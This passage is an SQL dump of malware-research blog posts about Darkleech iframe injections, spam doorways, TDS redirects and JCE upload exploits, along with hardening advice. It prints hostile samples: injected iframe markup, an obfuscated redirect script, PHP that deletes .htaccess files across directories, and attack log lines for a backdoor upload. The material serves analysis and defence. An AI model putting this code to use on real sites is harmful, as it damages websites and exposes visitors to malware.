INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (152, 'Darkleech Update – November 2014', 'unmask', '27 Nov 14', 'Loading site search ...          			                Darkleech Update – November 2014                          27 Nov 14   Filed in Short Attack Reviews, Website exploits                Just wanted to document some latest changes in Darkleech behavior that may help you detect it.I’d like to thank internet security enthusiasts who share their findings with me. Without you, I could have easily missed these new (?) details.Quick recapDarkleech is a root level server infection that installs malicious Apache modules. The modules inject invisible iframes into server response when it is already prepared (linebreaks added for readability).<style>.a4on6mz5h { position:absolute; left:-1376px; top:-1819px} </style> <div class=\"a4on6mz5h\"><ifr ame src=\"hxxp://tfmjst .hopto .org/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"247\" height=\"557\"></ifram e></div>All the elements of this code are random and auto-generated on the fly (style name, coordinates, iframe diminsions, URL paths). Moreover, the iframe domains change every few minutes — lately hackers prefer free No-IP.com dynamic DNS hostnames like hopto.org, ddns.net, myftp.biz, myftp.org, serveftp.com, servepics.com, etc.This infection is hard to detect as it only shows up once per IP per day (or maybe even more seldom). And since it works on a low system level, it can detect if server admins are logged in, so it lurks until they log out — this means that they won’t see anything even if they monitor outgoing TCP traffic.For more details, please check the links at the bottom of this post.What’s new?IE=EmulateIE9Recently, I’ve been pointed at the fact that now Darkleech also adds the following meta tag setting IE 9 compatibility mode in Internet Explorer. It looks like it searches for the </head> tag and replaces it with the following code (again, linebreaks added for readability):<meta http-equiv=\'x-ua-compatible\' content=\'IE=EmulateIE9\'></head><style>.syxq9la69 { position:absolute; left:-1666px; top:-1634px} </style> <div class=\"syxq9la69\"><iframe src=\"hxxp://jsnrgo .ddns .net/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"285\" height=\"554\"></iframe></div>This IE=EmulateIE9 instruction tells modern versions of Internet Explorer to render a web page as if they were IE 9, using all the features that has been deprecated in IE 10 and newer versions of IE. Some of the legacy features are known to have vulnerabilities and hackers try to exploit them turning the compatibility mode on (e.g. VML-related exploit)_SESSION_ID cookieIn addition to temporary IP blacklisting, Darkleech also uses the _SESSION_ID cookie that expires in one week. It adds the following cookie into response headers:Set-Cookie: _SESSION_ID=-1; expires=Wed 03-Dec-2014 09:32:48 GMT; path=/So even if you change your IP address (e.g. if you have a dynamic IP address) you still won’t see malware for the following 7 days. So don’t forget to clear/block cookies if you are trying to reproduce infected response.Most likely the IP blacklisting also works for one week now too.Just a couple of more things:As you might have figured out, it looks for Internet Explorer User-Agent (and derivatives like Maxthon, Avant).Referer is not important at the moment. I managed to trigger it even without the Referer header.That’s it for today. Please let me know if you have some other news about Darkleech.Previous posts about Darkleech:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsWorking With the Darkleech Bitly DataDarkleech + Bitly.com = Insightful Statistics (Sucuri blog)Server Compromises – Understanding Apache Module iFrame Injections and Secure Shell Backdoor (Sucuri blog)                                                                                   Tags: Apache Darkleech EmulateIE9 No-IP                                                    			                                            « Most Contradictive Doorway Generator                “Fancybox for WordPress Has Expired” Infection »            			    Reader\'s Comments (2)       	        			        			WordPress Malware Causes Psuedo-Darkleech Infection | Sucuri Blog | 26 Mar 2015 4:25 pm 						[…] and this is the code from November of 2014 […]                   			        			WordPress Malware Causas Psuedo-Darkleech Infección | Sucuri Español | 13 Apr 2015 10:41 pm 						[…] y este es el código de noviembre de 2014: […]', '', 'http://blog.unmaskparasites.com/2014/11/27/darkleech-update-november-2014/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (153, 'Most Contradictive Doorway Generator', 'unmask', '12 Sep 14', 'Loading site search ...          			                Most Contradictive Doorway Generator                          12 Sep 14   Filed in Short Attack Reviews                Check this thread on WordPress.org forum. The topic starter found a suspicious PHP file and asked what it was doing.The code analysis shows that it’s some sort of a spammy doorway. But it’s a very strange doorway and the way that it works doesn’t make sense to me.First of all, this script has a random text and code generator. The output it generates is [kind of] always unique. Here is a couple of output pages:http://pastebin.com/ymwMZMWPhttp://pastebin.com/Y6B7WM2T...<title>Is. Last spots brows: Dwelling. Immediately moral.</title></head><body>listend40721<span>Flowerill merry chimes - has: Her - again spirits they, wooers. Delight preserve. For he. Free - snow set - grave lapped, icecold made myself visitings allow, beeves twas. Now one:...We usually see such a random text, when spammers want search engines to index “unique” content with “right” keywords. But…1. the script returns the page with the 404 not found code.header(\"HTTP/1.1 404 Not Found\");so the page won’t be indexed by search engines.2. The obfuscated JavaScript code at the bottom of the generated page redirects to a pharma site after about a second.function falselye() { falselya=29; falselyb=[148,134,139,129,140,148,75,145,140,141,75,137,140,128,126,145,134,140,139,75,133,143,130,131,90,68,133,145,145,141,87,76,76,145,126,127,137,130,145,138,130,129,134,128,126,143,130,144,75,130,146,68,88];falselyc=\"\"; for(falselyd=0;falselyd<falselyb.length;falselyd++) { falselyc+=String.fromCharCode(falselyb[falselyd]-falselya); } return falselyc; } setTim eout(falselye(),1263);decodedwindow.top.location.href=\'hxxp://tabletmedicares .eu\';Update: on another site the script redirected to hxxp://uanlwkis .com (also pharma site), which was registered only a few days ago on Sept 6th, 2014.But the generated text has no pharma keywords. One more hint that it’s not for search engines. Maybe it’s an intermediary landing page of some email spam campaign that just needs to redirect visitors? I saw many such landing pages on hacked sites. But it most cases they looked like the decoded version of the script — just a redirection code. Indeed why bother with sophisticated random page generator if no one (neither humans nor robots) is going to read it?3. There is also this strange piece of code:$s=\'/\';if (strtolower(substr(PHP_OS,0,3))==\'win\') $s=\"\\\\\\\\\";$d=array(\".$s\");$p=\"\";for($i=1; $i<255; $i++){$p.=\"..$s\";if (is_dir($p)){array_push($d,$p);}else{break;}}foreach($d as $p){$a=\"h\".\"tac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}What it does it tries to find an delete(!) all file with names .htaccess, htaccess and htaccess.txt in the current directory and all(!) the directories above the current.That just doesn’t make sense. Why is it trying to corrupt websites? I would understand if it only removed its own files and injected code in legitimate files, but it tries to just remove every .htaccess (and its typical backups) without checking what’s inside. That’s a really disruptive and annoying behavior given that many sites rely on the settings in .htaccess (e.g. most WordPress and Joomla sites).It’s indeed a most contradictive doorway generator that I ever seen. I can’t find any good explanation why it does things the way it does. Maybe you have any ideas?Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for SpammersHtaccess Redirect to Example.ru/dir/index.phpIntroduction to Website Parasites                                                                                  Tags: doorway htaccess redirect                                                    			                                            « Google -> Doorway -> Google -> Spam                Darkleech Update – November 2014 »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/09/12/most-contradictive-doorway-generator/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (154, 'Google -> Doorway -> Google -> Spam', 'unmask', '11 Jun 14', 'Loading site search ...          			                Google -> Doorway -> Google -> Spam                          11 Jun 14   Filed in Uncategorized                Just a few thoughts about an interesting behavior of a black-hat SEO doorway.Typically hackers create doorways on compromised sites to make search engines rank them for certain keywords and then, when searchers click on the links in search results, those doorways redirect them further to a site that hackers really promote. Sometime that redirect may go through some TDS (traffic directing service) but the whole scheme remains pretty much the same:Search results -> doorway -> beneficiary siteToday, when doing a backlink research of one of such pharma doorways, I encountered a different scheme — a one with a loop.The doorway had this URL structure:http://www.hacked-site.com/blog/?prednisolone-without-prescriptionWhen I checked it in Unmask Parasites or in Google cache, I saw spammy content with links to doorways on other hacked sites. Quite typical.When I opened that page in a web browser, it redirected to a TDShxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&gdw=w-48&gdf=%2F90dc16aaf3e24ea68c94c3f784a37ff9-f08f149982bf04ffaa308aba00b2d569.txt&host=www.hacked-site.com&kw=prednisolone%20without%20prescription&HTTP_REFERER=https%3A%2F%2Fwww.google.com%2F%3Fsource%3Dnoref%26q%3Dprednisolone%2520without%2520prescriptionCloaking and conditional redirects to traffic directing services are also quite typical for doorways.Then TDS made another hop:hxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&seoref=8bB06MP5xFTR3TkqmNILbbW5mW30f%2B%2FMiQdbatwxiv5CUUTkQjEO75VtTs7IRqdVTmPfmX……..2FIXHlBdqV6iDd1ruYQMhqmYVCozdkTrAN76fOABiczAnd then I ended up on … Google:http://www.google.com/search?q=prednisolone+without+prescriptionAnd that is not very typical. But interesting.One one hand, it looks like the spammers didn’t consider me as a target traffic (probably because of my IP) and redirected back to the Google search results page for the same query that I supposed to be using when found that site. For some, this chain of redirects may look as if they clicked on a search result and then Google thought for some time and reloaded the same page, which may look like just a glitch.On the other hand, it looks like a second level of search engine optimization, when spammers fine tune a search query that may return better doorways. I can’t help thinking about this because when I see the search results on Google pages that the TDS redirects me to, I realize that most of them are doorways on hacked sites (yes, including those with fake stars in ratings).I know, it’s quite pointless. Why redirect people who already clicked on your doorway to a new set of search results? Although those results may contain some of your other doorways, there is no guarantee that the searcher will not go away or click on them and not on links of your competitors? And you can’t control Google search results — it may happen that there will be no your doorways on the results page.OK. Let’s try to think as the TDS owners. The TDS recognizes the traffic that it doesn’t need for the pharma campaign. It mayredirect it to pharma landing pages anyway (which may decrease the quality and the price of such a traffic)dispose of that traffic altogether (redirect it to a neutral third-party site, like Google)try to monetize that traffic anyway — redirect it to some scam site, porn site, malware site or any other resource that knows how to take advantage of low quality traffic.<warning:unfounded speculation>But what it the spammers also run another campaign that targets the traffic that doesn’t fit their pharma campaign? They can simply redirect the traffic to landing pages of the second campaign. But such traffic will not be targeted. People searched for different things. So maybe it is worth it to “re-target” the traffic and redirect the searchers to a Google result page for keywords relevant to that second campaign and that contains links to their doorways.Here’s the scenario:People search something on Google and click on some result. For some reason Google reloads the page and shows them completely different results for a different query. Some searchers will definitely leave (don’t worry, this was unwanted traffic anyway) but some may become interested in what Google offers them and click on results (after all spammers usually promote something that people need and if it comes from Google it looks more legit). So, instead of either lost or untargeted traffic, they get targeted traffic of people who willingly clicked on search results. All they need to do is make sure their doorways dominate for relevant search queries (shouldn’t be hard since the TDS provide the search query itself and there is no need to rank for short generic queries.)</warning:unfounded speculation>OK, enough speculations. That particular campaign was not using the second level Google optimization. It simply dumped unneeded traffic back to Google. When opening the same doorways from different country IPs, the TDS redirected me to a random “Canadian Pharmacy” site from its pool of about a dozen of sites.Anyway, the point of this post is despite of Matt Cutts’ recent announcement of rolling out the second ranking update for “very spammy queries” I still see that 50% or more of top search results for pharma keywords still point to doorways on hacked sites.This past weekend we started rolling out a ranking update for very spammy queries: http://t.co/NpUZRqpnBI— Matt Cutts (@mattcutts) May 21, 2014And as long as “very spammy queries” return “very spammy results”, there will be incentive for black hat SEOs to hack sites and create doorways there.Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesIntroduction to Website Parasites                                                                                  Tags: black hat seo doorway TDS                                                    			                                            « Working With the Darkleech Bitly Data                Most Contradictive Doorway Generator »            			    Reader\'s Comments (2)       	        			        			SearchCap: Google PayDay Loan 3.0, Bing Ads URL Tagging & World Cup Fever | 12 Jun 2014 9:14 pm 						[…] Google -> Doorway -> Google -> Spam, Unmask Parasites. Blog. […]                   			        			Rosanne & Jerry Shalf | 03 Dec 2014 6:27 pm 						I keep getting redirected to a Canadian drugstore site when I type in ashlandmuseum.org. Before the Canadian drugstore site pops up I see something that looks like tds….etc. but it quickly moves to the Canadian site, so I don’t know the complete set of letters.  I have a macbook pro 2012 and am using Maverick 10.9.5 OS.  It doesn’t always happen, which is weird, and it only happens on my computer, not others.  It happens when I use Firefox and Safari.  How do I get rid of it?  I had Applecare go through the machine and we got rid of various viruses, but we couldn’t fix this one.  Applecare said it was because of something Google did and only Google can fix, but I can’t figure out how to reach Google and ask for help.  Please, somebody, help me!!', '', 'http://blog.unmaskparasites.com/2014/06/11/google-doorway-google-spam/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (155, 'Working With the Darkleech Bitly Data', 'unmask', '10 Feb 14', 'Loading site search ...          			                Working With the Darkleech Bitly Data                          10 Feb 14   Filed in General                Data Driven Security took the time to analyze the raw data that I published in my recent post on Sucuri blog about how I used Bitly data to understand the scale of the Darkleech infection.In their article, they have a few questions about data formats, meaning of certain fields and some inconsistencies, so I’ll try to answer their questions here and explain how I worked with the data.So I needed to get information about all the links of the “grantdad” bitly account.I checked the API and somehow missed the “link_history” API request (it was the first time I worked with the bitly API), so I decided to screenscrape the web pages where bitly listed the links creaded by grantdad. 1,000 pages with 10 links on each. Since pages didn’t contain all the information I needed I only collected the short links so that I could use them later in API calls to get more detailed information about each of them.As you can see I was limited with the 10,000 links that bitly made available via their web interface. Not sure if I could get more links via that link_history API. Right now it returns “ACCOUNT_SUSPENDED” and when it was not suspended, API calls for known links beyond those 10,000 produced various errors.When I compiled my list of 10,000 links I used the following API calls to get information about each of the links:Referring domainsAPI:link/referring_domains — for each link, it returned a list of domains referring traffic to this link (in our case sites, containing the iframes) along with the number of clicks from each domain. This helped me compile this list of iframe loads per domain: http://pastebin.com/HYaY2yMb. Then I tried to resolve each of the domain names and created this list of infected domains per IP address: http://pastebin.com/Gxr51Nc1.I also used this API call to get number of iframe loads for each bitly link.InfoAPI:link/info – this gave me timestamps of the links and their long URLs (the rest information was not interesting for my research). Unfortunately, this particular API call is poorly documented so I can only guess what this timestamp mean. It is actually called “indexed“. But I guess it’s the time when the link was created. It is definiteley not the time of the first click because there were no registered clicks for many of the links. As a result, I compiled these datasets:http://pastebin.com/UmkDZZp0http://pastebin.com/w7Kq3ybV ,which contain tab separated values of “bitly link id”, “timestamp”, “# of clicks/iframe loads”, and “long URL”.At that point, I already had the number of iframe loads from the previous step (“link/referring_domains“). Then, for readability, I converted the numeric timestamp using this Python function datetime.datetime.fromtimestamp(). However, you can notice that the second dataset (for January 28th) has a different date format. Instead of “2014-01-25 19:10:07” it uses “Jan 28 23:10:19“. Why? Because of pastebin.com. Because it doesn’t allow unregistered users to post more than 500Kb of data (I deliberately post such data as a guest). Removing the year from the date allowed me to save 4 bytes on each row and fit the dataset in 500Kb.Actually this 500Kb limit is the reason why I have separate pastebins for each date and only specify bitly ids instead of the full bitly links.CountriesAnd finally, API:link/countries – for each link, it returned a list of countries referring traffic to this link along with the number of clicks from those countries. This helped me compile this list of iframe loads per country http://pastebin.com/SZJMw3vx.The last dataset Feb 4-5When I wrote my blogpost on February 5th, I noticed that there were new links available on the Bitly.com grantdad acount page. I began to browse pages of his links and figured that most of the links were the same (Jan 25 and 28) but around 1,700 of them were new (late February 4th and the beginning of February 5th). I immediately repeated the same procedure that included screenscraping, and 3 API calls for each new bitly link. After that I created this new dataset http://pastebin.com/YecHzQ1W and updated the rest datasets (domains, countries, etc).Some more detailsIf you check the total numbers in these two datasets (domains) http://pastebin.com/HYaY2yMb and (countries) http://pastebin.com/SZJMw3vx you’ll see the different in total number of iframe loads: 87152 and 87269. I don’t know why. I used the same links just different API calls (referring_domains and countries) and the totals are supposed to be the same. I didn’t save the “per link” data so can’t tell exactly whether it was my error or the bitly API produces slightly inconsistent results. Anyway, the difference is neglectable for my calculations and doesn’t affect the estimations (given that I tried to underestimate when in doubt ).I didn’t check for duplicates that guys from Data Driven security found in my datasets. They must have to do with my screenscraper and the way that Bitly.com displays links in user accounts. The total number of scraped links matched the number of links that Bitly reported for the user. The extra 121 clicks that these duplicates are responsible for are so close to the 117 difference that I mentioned above so I wonder if these numbers somehow connected? Anyway, this shouldn’t affect the accuracy of the estimates either.Building the geo distribution mapFor the map, I used the Geochart from Google visualization. Since the difference in numbers of clicks for the top 3 countries and the lower half of the list was 3 orders of magnitude, I had to re-scale the data so that we could still see the difference between countries with 50 iframe loads and 2 iframe loads.. I used a square of a natural logarithm for thatMath.pow( Math.round( Math.log(i)), 2)This gave me a nice distribution from 0 to 100 and the below map.IFrame Load Geo DistributionSpeculation on the link generationAfter checking the link creation per minute-of-an-hour distribution, Bob Rudis wondered:This is either the world’s most inconsistent (or crafty) cron-job or grantdad like to press ↑ + ENTER alot.I guess, it was neither cron-job nor manual link creation. I think the [bitly] links were created on-demand. So if someone loads a page and Darkleech needs to inject an iframe then it (or rather the server it works with) generates a new bitly link. Given that this malware may lurk on a server, there may be time periods when no malicious code is being injection into any web pages across all the infected servers. At the same time, the bitly links with zero clicks may refer to page loads by various bots (including our own) when the malicious code is injected but the iframe is never loaded. On the other hand, the volume of bitly links with 0 clicks (~35%) suggests that there might really more complex link generation mechanism than a simple “on-demand” approach.Anyway, that’s great when people double check our data and try to find new interesting patterns there. Make sure to let me know (here or on the Sucuri blog) if you find more patterns and inconsistencies, or have any comments on how the Darkleech works.Related posts:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsBety.php Hack. Part 2. Black Hats in Action.Introduction to Website Parasites                                                                                  Tags: Bitly Darkleech data statistics                                                    			                                            « Invasion of JCE Bots                Google -> Doorway -> Google -> Spam »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/02/10/working-with-the-darkleech-bitly-data/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (156, 'Invasion of JCE Bots', 'unmask', '27 Jan 14', 'Loading site search ...          			                Invasion of JCE Bots                          27 Jan 14   Filed in Website exploits                Joomla has been one of the most popular CMS for a long time.  It powers a huge number of sites.  That’s great! The flip side of this fact is Joomla has been very popular for a long time and there are still very many sites that use older versions of Joomla as well as older version of Joomla components. For example, the 1.5.x branch of Joomla (2008-2010) still has a noticeable share in live Joomla sites.Old versions may work well for your site but they have multiple well known security holes, so they are the low hanging fruit for hackers. Let me show this using a real world example.JCE attackThere is a JCE component — a fancy content editor that can be found almost on every Joomla site. It has a well known security hole that allows anyone to upload arbitrary files to a server.You can easily find a working exploit code for this vulnerability.  What it does is:Checks whether a vulnerable version of JCE is installed (2.0.11, 2.0.12, 2.0.13, 2.0.14, 2.0.15, 1.5.7.10, 1.5.7.11, 1.5.7.12, 1.5.7.13, 1.5.7.14)Exploits the bug in the JCE image manager to upload a PHP file with a .gif extenstion to the images/stories directoryThen uses a JSON command to rename the .gif file to *.php.Now you have a backdoor on a server and can do whatever you want with the site.This is how this attack looks in logs (real example):197.205.70.37 - - [23/Jan/2014:16:46:54 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.0\" 200 302 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20 HTTP/1.0\" 200 329 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"GET /images/stories/3xp.php HTTP/1.0\" 200 465 \"-\" \"BOT/0.1 (BOT for JCE)\"As I mentioned, JCE is a very popular component and there are still many sites that use old versions of this component. No wonder, hackers are scanning the Internet for such vulnerable sites.  They reworked the exploit code for use in their automated tools that relentlessly test millions of sites, one by another.  These days, I can find multiple requests with the “BOT/0.1 (BOT for JCE)” User-Agent string in logs of almost every site that I check, even in logs of sites that have never had Joomla installed.I’d like to share some interesting statistics of a real site that had been hacked using this JCE hole and then was being routinely reinfected every day.7,409 requests with the User-Agent “BOT/0.1 (BOT for JCE)” that came from 785 different IPs during the period of Dec 24th – Jan 24th (one month)239 requests from 51 unique IP addresses during the last 24 hours4 independent (uploaded different types of backdoors) successful infections during one day.plus, multiple tests for other vulnerabilities.To webmastersAs you can see,  this is something that you can’t neglect or consider an insignificant threat.  It’s silly to hope that hackers won’t find your site. Today hackers have resources to spider the Internet almost as efficiently as Google just about 10 years ago, so there is almost no chance your site will stay unnoticed. The only way to prevent the hacks is to be proactive:  keep all software up-to-date and harden your sites.In case of this particular JCE attack:Make sure to upgrade your Joomla site to the most current version.Upgrade JCE to the latest version. You can find download packages for all the three branches of Joomla here.Protect all file upload directories and all directories that shouldn’t contain .php files. For example, place the following .htaccess file there to prevent execution of PHP files:<Files *.php>deny from all</Files>Try blocking requests with the “BOT/0.1 (BOT for JCE)” User-Agent string.  Of course, this shouldn’t be considered as a real protection. Hackers can change the User-Agent string to whatever they want. But it can help keep some dumb annoying bots away from your site.If, for some reason, you can’t upgrade your site at this moment, consider placing it behind a website firewall that will block any malicious traffic before it reaches your server.  This is something that we call virtual patching in Sucuri CloudProxy.                                                                                  Tags: exploit JCE Joomla                                                    			                                            « Reporting Suspicious Styles                Working With the Darkleech Bitly Data »            			    Reader\'s Comments (8)       	        			        			Jim Walker | 28 Jan 2014 5:47 pm 						Nicely done!The JCI component “problem” and has been a thorn in the Joomla communities side for years.I would go so far as to say that 1/2 of all of the hacked Joomla installations I’m asked to repair are JCE exploit related.As mentioned, simply adding the .htaccess “no execute php” file within the images/stories directory generally does the trick, though upgrading is always best.Personally, for this particular exploit, I prefer the below in my .htaccess file:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shI like how you linked out to Google and known JCE exploits as well.A quality post top to bottom. Kudos!                   			        			Denis | 28 Jan 2014 7:12 pm 						Thanks Jim,That “text/plain” handler also does the trick and covers a broader range of attacks.I don’t want to link directly to exploits. But if you want to find the information, this Google search is enough. At the same time, if there is some new JCE file upload vulnerability, this search will show it too, so the link will remain fresh and useful.                   			        			machineX | 19 Sep 2014 9:05 am 						I just seen it in some logs for the second time. We do not use joomla. But I think your .htaccess code is very useful in preventative measures for sites overall.                   			        			Brian M | 20 Feb 2014 3:10 pm 						I’m curious if you would have any more information on exactly what is allowing the exploit to work? I understand it’s an exploit in code which was in an old version of Joomla, but my vBulletin sites are apparently being exploited by this Bot for JCE script. I do not have any pieces of Joomla installed on the server – at least, not that I’m aware of. Thankfully Microsoft Security Essentials is catching the backdoor/shell script being uploaded to the site and is removing it before they can use it, but it scares me that they’re able to upload the file to my site in the first place. I’ve tried to get help from vBulletin but they brush it off as not being on their end.                   			        			Denis | 11 Jun 2014 5:13 pm 						In case of Joomla JCE, it just uses a bug to upload a PHP file as a .gof and then change it’s extension to .php.If you don’t have Joomla, then you might see multiple attempts to scan your site for that JCE security hole. They do it on every site. If they find it – they exploit it, if not they move on to the next site. So what you are seeing is probably just attack attempts, not successful attacks. On the other hand, if hackers find vulnerabilities in vBulletin or any other type of site, they’ll most likely upload pretty much the same backdoors as if it was Joomla.vBulletin may be slightly different as most of it’s malware lives in its database.                   			        			JCE Joomla Extension Attacks in the Wild | Sucuri Blog | 26 Mar 2014 8:11 pm 						[…] Unmask: Invasion of JCE Bots […]                   			        			catalina | 30 Mar 2014 6:23 am 						If I understood, I have to open my .htaccess file and insert these lines:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shThats it?Which are the “collateral effects” of this?Thanks in advanceCatalina                   			        			Denis | 11 Jun 2014 5:16 pm 						This code makes web server treat such files as regular text files. I.e. instead of executing any code in them, it will just display their content in a browser as if they were plain text files.The side effect is you won’t be able to have executable scripts in those directories. But it’s the point of this trick – place it to the directories that shouldn’t have executable files', '', 'http://blog.unmaskparasites.com/2014/01/27/invasion-of-jce-bots/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (157, 'Reporting Suspicious Styles', 'unmask', '22 Nov 13', 'Loading site search ...          			                Reporting Suspicious Styles                          22 Nov 13   Filed in Unmask Parasites                Back in 2008, the very first task that I created Unmask Parasites for was scanning web pages for hidden links.I read an article about thousands of WordPress blogs being stuffed with dozens of invisible spammy links. I had a self-hosted WordPress blog too and that article made me think if there was some easy way to figure out whether my blog was hacked, something less laborious than manually examining the HTML code link by link. So I decided to create a tool that would show all domains that my web pages linked to highlighting those of them that had “invisible” styles. This approach has proved to be very efficient in identifying black hat SEO hacks. In most cases, a glance is enough to spot such problems.It works well even when the tool doesn’t highlight links as “hidden” (either because the “hiding rule” was not detected or because it scanned the “cloaked” page created specifically for search engines). You can still see the links that clearly don’t belong to your site, which tells you that something’s wrong.However, looking for suspicious links is not the bullet-proof method for detecting spam injection issues. For example, in my yesterday’s post on Sucuri blog, I wrote about fake WordPress plugins that used to injects spammy links and a JavaScript code into web pages. However, at the moment, they inject some hidden spammy auto-generated text that doesn’t have any links.You can use this Google query to reveal affected sites [cigarettes AND (“3200 unhealthy” OR “3300 hazardous”)]I don’t know why they do it, but webmasters should definitely be warned about such injections because it’s a sign of a problem that should be fixed as soon as possible. This is actually more serious than just a factor that can potentially affect site’s search ranking. Those fake plugins fetch the spammy content from remote servers and inject it into blog pages on the fly. This means that hackers can change it any time and the same moment the new spammy block will be injected into all compromised sites. Or it can be a malicious block, which makes things more serious as it will affect all visitors to those sites too.Unfortunately, such injections were not reported by Unmask Parasites since there were no links in the spammy block. After thinking about the problem, I decided that Unmask Parasites should also report pure HTML tricks such as that clip:rect style trick that hackers use to hide their injections.So , starting this week, you may see the “Suspicious Styles” section in Unmask Parasites reports.In this section, you will see excerpts of the style definitions that Unmask Parasites considers suspicious. If you see it in your site reports, then you should check the HTML code of your pages and figure out whether that style is a normal part of your pages or it was added there to hide something illicit.Note, if you can’t find such code in your web pages, it doesn’t mean it is not there. The code injection can be conditional, and server files may fetch it from a remote location (as in this case with fake WordPress plugins), or it can be encrypted. Just remember that Unmask Parasites works in real time (some results may be cached for up to an hour) and if it reports something, then you can be sure it was on a web page at the moment of scanning.To Unmask Parasites usersIf you like Unmask Parasites and want to help improve it, you can inform me about interesting tricks that hackers use to hide injected content Or send me examples of infected web pages where Unmask Parasites doesn’t report any problems.Thanks!Related posts:Unmasking “Canonical” HacksRich Snippets in Black Hat SEOIntroduction to Website Parasites                                                                                  Tags: black hat seo hidden links spam                                                    			                                            « Unmask Parasites joins Sucuri                Invasion of JCE Bots »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/11/22/reporting-suspicious-styles-2/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (158, 'Unmask Parasites joins Sucuri', 'unmask', '20 Sep 13', 'Loading site search ...          			                Unmask Parasites joins Sucuri                          20 Sep 13   Filed in Unmask Parasites                It’s official. This week Unmask Parasites joins Sucuri!Since July of 2008 when I released the first public version, Unmask Parasites was a “one man project” and it worked fine for me most of the time. I did everything myself from server setup to site development, from web attack investigations to blogging here. During these years Unmask Parasites became quite noticeable both within webmasters and Internet security community. And I always tried to meet their expectations providing a tool that could reveal various obscure website security issues and sharing information on how and why websites get hacked, and what can be done to prevent it.When Sucuri approached me and asked if I wanted to join their team as a malware researcher, I didn’t think much. I’ve been watching this company since 2010 and knew how much we had in common in our approach to Internet security. We both focus on helping site owners to detect security problems and protect their sites. We do our best to educate webmasters about things that hackers do with compromised websites — unmasking their dirty tricks is an important part of our work. In 2011 we established good relationship and began to help each other by sharing our information about ongoing massive attacks. Now Sucuri has grown to one of the leading companies in its field and makes a significant impact on how many thousands of site owners protect their sites. It’s an honor for me to join this company and the team of professionals that I know for so long time.I guess you wonder what will happen to Unmask Parasites scanner and this blog? They are here to stay! I will still be responsible for Unmask Parasites and continue to improve it and publish my blogposts here. Even better: now that I’m with Sucuri, I will have access to large volumes of data from their tools and support team (something that I really missed during the last five years), which will definitely facilitate my investigations, and, in turn, improve the quality of Unmask Parasites scanner and Sucuri own tools.For additional information check the Sucuri’s announcement.Let’s unmask parasites!Related posts:Let’s Unmask Parasites1 Million Pages Checked by Unmask Parasites!Unmask Parasites. A Year of Blogging.                                                                                  Tags: Sucuri                                                    			                                            « Analyzing [Buy Cialis] Search Results                Reporting Suspicious Styles »            			    Reader\'s Comments (2)       	        			        			Jackie McBride | 21 Sep 2013 3:36 pm 						Denis, I cannot think of anyone more deserving than you of this opportunity. Hearty congratulations & many blessings in your new venture as you go forward! & Sucuri better realize how damn lucky they are lol. From the sound of the announcement, it appears they do. Again, congratulations!                   			        			Sucuri Expands Research Efforts with Acquisition of Unmask Parasites | Sucuri Blog | 15 Sep 2014 11:50 pm 						[…] Unmask Parasites blog post […]', '', 'http://blog.unmaskparasites.com/2013/09/20/unmask-parasites-joins-sucuri/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (159, 'Analyzing [Buy Cialis] Search Results', 'unmask', '21 Aug 13', 'Loading site search ...          			                Analyzing [Buy Cialis] Search Results                          21 Aug 13   Filed in General                A few days ago I was updating the spammy word highlighting functionality  in Unmask Parasites results and needed to test the changes on real websites. To find hacked websites with spammy content I would normally google for [viagra] or [cialis], which are arguably the most targeted keywords used in black hat SEO hacks. However after the Google’s June update in how they rank web pages for spammy queries, I didn’t have much expectation of seeing hacked sites on the first page of search results for my usual [buy cialis] query and was ready to check a few more pages.We just started a new ranking update today for some spammy queries. See 2:30-3:10 of this video: http://t.co/KOMozoc3lo #smx— Matt Cutts (@mattcutts) June 11, 2013Indeed, for queries like [payday loans] I can see quite relevant results on the first three pages. All sites are specialized and don’t look like doorways on hacked sites. That’s really good. For [viagra] I found only one result on the first page pointing to a doorway on a hacked site. Still good.However, when I entered a really spammy combination [buy viagra], the search results were less than optimal — 5 out of 10 led to hacked sites. And at least 